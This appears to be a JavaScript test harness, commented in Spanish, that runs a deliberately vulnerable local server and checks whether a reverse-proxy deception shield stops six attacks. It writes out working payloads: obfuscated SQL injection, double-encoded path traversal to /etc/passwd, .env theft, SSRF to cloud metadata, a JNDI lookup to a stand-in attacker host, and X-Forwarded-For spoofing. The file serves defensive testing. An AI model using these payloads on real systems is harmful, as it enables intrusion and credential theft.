/**
 * @fileoverview Campo de Tiro Real (Live Cyber Range) v5.0:
 * Levanta un Servidor Víctima Real Vulnerable en un puerto efímero y ejecuta
 * ataques reales de Red Team en dos rondas:
 *   - Ronda 1: Ataque directo al Servidor Víctima SIN Guardianes Eternos.
 *   - Ronda 2: Los mismos ataques con técnicas de evasión contra Guardianes Eternos v5.0
 *              Data Plane en modo Reverse-Proxy delante del Servidor Víctima.
 */

import http from 'node:http';

function decodeRecursive(val) {
  let out = String(val || '');
  for (let i = 0; i < 3; i += 1) {
    try {
      const next = decodeURIComponent(out.replace(/\+/g, ' '));
      if (next === out) break;
      out = next;
    } catch {
      break;
    }
  }
  return out;
}

/**
 * Crea un Servidor Víctima Real deliberadamente vulnerable para pruebas de penetración aisladas.
 */
export function createVulnerableTargetServer() {
  const server = http.createServer((req, res) => {
    const safeRawUrl = String(req.url || '/').replace(/^\/+/, '/');
    const reqUrl = new URL(safeRawUrl, `http://${req.headers.host || '127.0.0.1'}`);
    const pathLower = reqUrl.pathname.replace(/\/+/g, '/').toLowerCase();
    const decodedFull = decodeRecursive(reqUrl.pathname + reqUrl.search);

    // 1. Robo de archivo .env (incluso con // o mayúsculas)
    if (pathLower.includes('.env')) {
      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('DB_PASSWORD=MasterRoot2026!\nSTRIPE_LIVE_SECRET=sk_live_VICTIMA_0001\nJWT_SIGNING_KEY=SuperSecretVictimKey99\n');
      return;
    }

    // 2. SQL Injection en la ruta raíz / (incluso con UN/**/ION)
    const strippedSql = decodedFull.replace(/\/\*[\s\S]*?\*\//g, '').toLowerCase();
    if (reqUrl.pathname === '/' && reqUrl.searchParams.has('id') && strippedSql.includes('union') && strippedSql.includes('select')) {
      res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
      res.end(JSON.stringify({
        vulnerable: true,
        leaked_table: 'admin_users',
        rows: [{ user: 'admin@empresa-victima.com', pass: 'Hash_Pass_9981!' }]
      }));
      return;
    }

    // 3. Path Traversal LFI en /download
    if (reqUrl.pathname === '/download' && decodedFull.toLowerCase().includes('etc/passwd')) {
      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n');
      return;
    }

    // 4. SSRF Cloud Metadata en /webhook
    if (reqUrl.pathname === '/webhook' && decodedFull.includes('169.254.169.254')) {
      res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
      res.end(JSON.stringify({
        ssrf_success: true,
        iam_role: 'EC2-Production-Admin',
        AccessKeyId: 'AKIAVICTIMATOKEN99'
      }));
      return;
    }

    // 5. JNDI / Java4Shell probe en /api/login
    if (reqUrl.pathname === '/api/login' && decodedFull.toLowerCase().includes('${jndi:')) {
      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('JNDI_RCE_TRIGGERED: uid=0(root) gid=0(root) groups=0(root)');
      return;
    }

    // 6. Exfiltración directa por agente ARTEX sin autorización
    if (reqUrl.pathname === '/api/admin/export') {
      res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
      res.end(JSON.stringify({ exported_customers: 14500, leaked: true, database: 'crm_prod' }));
      return;
    }

    // Rutas legítimas del portal empresarial
    if (reqUrl.pathname === '/servicios') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end('<html><body><h1>Servicios Digitales 365 Collaboration</h1><p>Portal Legitimo OK</p></body></html>');
      return;
    }

    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end('<html><body><h1>Portal Empresarial Demo</h1><p>Bienvenido</p></body></html>');
  });

  return server;
}

const RED_TEAM_ATTACKS = [
  {
    id: 'sqli-obfuscated-root',
    name: 'SQL Injection Ofuscado en Raíz (UN/**/ION)',
    pathAndQuery: "/?id=1'%20UN/**/ION%20SEL/**/ECT%20user,pass%20FROM%20admin_users--",
    userAgent: 'sqlmap/1.8.4',
    headers: {},
    leakSignature: 'Hash_Pass_9981!'
  },
  {
    id: 'canary-evasion-env',
    name: 'Evasión Canario (Doble Barra + Mayúsculas)',
    pathAndQuery: '///.ENV.backup',
    userAgent: 'python-requests/2.32.3',
    headers: {},
    leakSignature: 'STRIPE_LIVE_SECRET'
  },
  {
    id: 'lfi-double-encoded',
    name: 'Path Traversal Doble Codificación (%252e%252e)',
    pathAndQuery: '/download?file=%252e%252e%252f%252e%252e%252fetc/passwd',
    userAgent: 'nuclei/3.3.1',
    headers: {},
    leakSignature: '/bin/bash'
  },
  {
    id: 'ssrf-aws-metadata',
    name: 'SSRF Robo Credenciales AWS Metadata',
    pathAndQuery: '/webhook?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    userAgent: 'httpx/0.27.2',
    headers: {},
    leakSignature: 'AKIAVICTIMATOKEN99'
  },
  {
    id: 'rce-jndi-java4shell',
    name: 'RCE / JNDI / Java4Shell Probe',
    pathAndQuery: '/api/login?token=${jndi:ldap://evil.attacker.invalid/Exploit}',
    userAgent: 'Mozilla/5.0',
    headers: {},
    leakSignature: 'JNDI_RCE_TRIGGERED'
  },
  {
    id: 'artex-ip-spoof',
    name: 'Agente ARTEX + Spoofing X-Forwarded-For',
    pathAndQuery: '/api/admin/export',
    userAgent: 'ARTEX-Worker/2.1 HeadlessChrome',
    headers: { 'x-artex-agent': 'ARTEX-MultiAgent/Playwright', 'x-forwarded-for': '9.9.9.1' },
    leakSignature: 'exported_customers'
  }
];

/**
 * Ejecuta la batalla real comparativa: Ronda 1 (Sin Escudo) vs Ronda 2 (Con Guardianes Eternos v5.0 Reverse-Proxy).
 */
export async function runLiveCyberRangeComparison(createGuardianesServerFn) {
  const victimServer = createVulnerableTargetServer();
  await new Promise((resolve) => victimServer.listen(0, '127.0.0.1', resolve));
  const victimPort = victimServer.address().port;
  const victimUrl = `http://127.0.0.1:${victimPort}`;

  const instance = createGuardianesServerFn({
    dbPath: ':memory:',
    memoryFilePath: null,
    adminToken: 'cyber-range-ephemeral-token',
    aiConfig: { tarpitDelayMs: 0 },
    shieldConfigOverride: {
      shieldMode: 'reverse-proxy',
      protectedTargetUrl: victimUrl,
      trustProxyHeaders: false,
      injectDomCanary: true
    }
  });
  const shieldServer = instance.dataServer;
  const swarm = instance.swarm;

  await new Promise((resolve) => shieldServer.listen(0, '127.0.0.1', resolve));
  const shieldPort = shieldServer.address().port;
  const shieldUrl = `http://127.0.0.1:${shieldPort}`;

  try {
    // --- RONDA 1: Ataque directo al Servidor Víctima (SIN ESCUDO) ---
    const round1 = [];
    for (const atk of RED_TEAM_ATTACKS) {
      const res = await fetch(`${victimUrl}${atk.pathAndQuery}`, {
        headers: { 'User-Agent': atk.userAgent, ...atk.headers }
      });
      const body = await res.text();
      const compromised = body.includes(atk.leakSignature);
      round1.push({
        id: atk.id,
        name: atk.name,
        payload: atk.pathAndQuery,
        compromised,
        statusCode: res.status,
        evidencePreview: body.slice(0, 140).replace(/\s+/g, ' ')
      });
    }

    // --- RONDA 2: Visitante Legítimo + Mismo Ataque contra GUARDIANES ETERNOS (CON ESCUDO) ---
    const legitRes = await fetch(`${shieldUrl}/servicios`, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0' }
    });
    const legitBody = await legitRes.text();
    const legitVisitorCheck = {
      passed:
        legitRes.status === 200 &&
        legitBody.includes('Portal Legitimo OK') &&
        legitBody.includes('guardianes-sensor.js') &&
        legitRes.headers.get('x-protected-by') === 'Guardianes-Eternos-Deception/5.1',
      statusCode: legitRes.status,
      protectedHeader: legitRes.headers.get('x-protected-by'),
      canaryInjectedInHtml: legitBody.includes('/api/v1/internal/admin-keys')
    };

    // 2B. Lanzar los 6 ataques reales contra el Escudo
    const round2 = [];
    for (const atk of RED_TEAM_ATTACKS) {
      if (atk.id !== 'artex-ip-spoof') {
        swarm.memory.reset(true);
      }

      const res = await fetch(`${shieldUrl}${atk.pathAndQuery}`, {
        headers: { 'User-Agent': atk.userAgent, ...atk.headers }
      });
      const body = await res.text();
      const leakedRealData = body.includes(atk.leakSignature);
      const trappedInLabyrinth =
        (Boolean(res.headers.get('x-canary-watermark')) || res.status === 403) && !leakedRealData;
      const directive = res.headers.get('x-kernel-verification-directive') || (res.status === 403 ? 'REQUEST_BLOCK_403' : '');

      round2.push({
        id: atk.id,
        name: atk.name,
        payload: atk.pathAndQuery,
        blockedAndTrapped: trappedInLabyrinth,
        leakedRealData,
        canaryWatermark: res.headers.get('x-canary-watermark') || null,
        idpiDirective: directive,
        responsePreview: body.slice(0, 140).replace(/\s+/g, ' ')
      });
    }

    // 2C. Prueba Anti-Spoofing: atacante ya en cuarentena intenta rotar X-Forwarded-For y x-sim-session para tocar /servicios
    const spoofRes = await fetch(`${shieldUrl}/servicios`, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Clean-Look-Browser)',
        'x-forwarded-for': '8.8.4.4',
        'x-sim-session': 'try-bypass-quarantine'
      }
    });
    const spoofBody = await spoofRes.text();
    const antiSpoofCheck = {
      spoofBlocked:
        Boolean(spoofRes.headers.get('x-canary-watermark')) &&
        !spoofBody.includes('Portal Legitimo OK'),
      canaryWatermark: spoofRes.headers.get('x-canary-watermark') || null
    };

    const r1Breaches = round1.filter((r) => r.compromised).length;
    const r2Trapped = round2.filter((r) => r.blockedAndTrapped).length;
    const r2Leaks = round2.filter((r) => r.leakedRealData).length;

    return {
      executedAt: new Date().toISOString(),
      victimOrigin: victimUrl,
      shieldOrigin: shieldUrl,
      round1Summary: {
        totalAttacks: round1.length,
        breachesSucceeded: r1Breaches
      },
      round2Summary: {
        totalAttacks: round2.length,
        trappedByGuardianes: r2Trapped,
        realDataLeaks: r2Leaks
      },
      legitVisitorCheck,
      antiSpoofCheck,
      round1,
      round2
    };
  } finally {
    await instance.closeAll();
    await new Promise((resolve) => victimServer.close(resolve));
  }
}
